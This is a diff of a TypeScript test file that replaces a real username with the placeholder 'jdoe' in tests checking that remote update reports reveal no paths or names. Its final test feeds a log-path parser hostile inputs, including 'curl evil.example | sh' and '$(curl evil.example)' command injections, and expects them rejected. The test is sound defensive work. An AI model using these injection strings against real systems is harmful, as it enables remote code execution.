@@ -35,7 +35,7 @@ afterEach(() => {
 });
 
 function farMachine(over: { managed?: boolean; version?: string; sessions?: number; answer?: string | null; duringCheck?: () => void } = {}) {
-  const home = join(root, "Users", "ramos");
+  const home = join(root, "Users", "jdoe");
   const dataDir = join(home, ".plannotator");
   mkdirSync(dataDir, { recursive: true });
   process.env.PLANNOTATOR_DATA_DIR = dataDir;
@@ -251,17 +251,17 @@ describe("what the far machine tells the other one", () => {
     expect(answer.failure?.exit_code).toBe(75);
     expect(answer.failure?.prepare).toBe("the temp folder ~/tmp is full (ENOSPC)");
     const wire = JSON.stringify(answer);
-    expect(wire).not.toContain("ramos");
+    expect(wire).not.toContain("jdoe");
     expect(wire).not.toContain(far.home);
     expect(wire).not.toContain("secret");
   });
 
   test("a temp folder outside the home folder stays on that machine, and the reason still says what to do", async () => {
     const reasons: [string, string][] = [
-      ["the temp folder /tmp/user/ramos is full (ENOSPC)", "the temp folder is full (ENOSPC)"],
-      ["the temp folder /tmp/my user/ramos can't be written (EACCES)", "the temp folder can't be written (EACCES)"],
-      ["the temp folder /var/folders/ramos/T does not exist (ENOENT)", "the temp folder does not exist (ENOENT)"],
-      ["could not write to the temp folder /tmp/user/ramos (EIO: i/o error, mkdtemp '/tmp/user/ramos/plannotator-update-abc')", "could not write to the temp folder (EIO: i/o error, mkdtemp '…')"],
+      ["the temp folder /tmp/user/jdoe is full (ENOSPC)", "the temp folder is full (ENOSPC)"],
+      ["the temp folder /tmp/my user/jdoe can't be written (EACCES)", "the temp folder can't be written (EACCES)"],
+      ["the temp folder /var/folders/jdoe/T does not exist (ENOENT)", "the temp folder does not exist (ENOENT)"],
+      ["could not write to the temp folder /tmp/user/jdoe (EIO: i/o error, mkdtemp '/tmp/user/jdoe/plannotator-update-abc')", "could not write to the temp folder (EIO: i/o error, mkdtemp '…')"],
     ];
     for (const [reason, said] of reasons) {
       const far = farMachine();
@@ -284,12 +284,12 @@ describe("what the far machine tells the other one", () => {
   });
 
   test("a path outside the home folder never carries a name either", () => {
-    expect(machinePath("/Users/ramos/.plannotator/update.log", "/Users/ramos")).toBe("~/.plannotator/update.log");
-    expect(machinePath("C:\\Users\\ramos\\.plannotator\\update.log", "C:\\Users\\ramos")).toBe("~\\.plannotator\\update.log");
+    expect(machinePath("/Users/jdoe/.plannotator/update.log", "/Users/jdoe")).toBe("~/.plannotator/update.log");
+    expect(machinePath("C:\\Users\\jdoe\\.plannotator\\update.log", "C:\\Users\\jdoe")).toBe("~\\.plannotator\\update.log");
     // Not the same folder, though it starts the same.
-    expect(machinePath("/Users/ramos2/update.log", "/Users/ramos")).toBe("update.log");
-    expect(machinePath("/srv/plannotator/ramos/update.log", "/Users/ramos", "/srv/plannotator/ramos")).toBe("$PLANNOTATOR_DATA_DIR/update.log");
-    expect(machinePath("/mnt/ramos/update.log", "/Users/ramos", "/srv/x")).toBe("update.log");
+    expect(machinePath("/Users/jdoe2/update.log", "/Users/jdoe")).toBe("update.log");
+    expect(machinePath("/srv/plannotator/jdoe/update.log", "/Users/jdoe", "/srv/plannotator/jdoe")).toBe("$PLANNOTATOR_DATA_DIR/update.log");
+    expect(machinePath("/mnt/jdoe/update.log", "/Users/jdoe", "/srv/x")).toBe("update.log");
   });
 
   test("only a state, a version that reads as one, and whether the script owns it pass: nothing it could point at", () => {
@@ -323,7 +323,7 @@ describe("what this machine shows of that machine's answer", () => {
     for (const log of ["~/.plannotator/update.log", "~\\.plannotator\\update.log", "~/My Data/plannotator/update.log", "$PLANNOTATOR_DATA_DIR/update.log", "update.log"]) {
       expect([log, parseFarDetails({ log }).log]).toEqual([log, log]);
     }
-    for (const log of ["curl evil.example/update.log", "~/x; curl evil.example | sh; update.log", "~/$(curl evil.example)/update.log", "~/x`id`/update.log", "~/x\nupdate.log", "https://evil.example/update.log", "/Users/ramos/update.log", "~/notes.txt", 7, null]) {
+    for (const log of ["curl evil.example/update.log", "~/x; curl evil.example | sh; update.log", "~/$(curl evil.example)/update.log", "~/x`id`/update.log", "~/x\nupdate.log", "https://evil.example/update.log", "/Users/jdoe/update.log", "~/notes.txt", 7, null]) {
       expect([log, parseFarDetails({ log }).log]).toEqual([log, ""]);
     }
   });
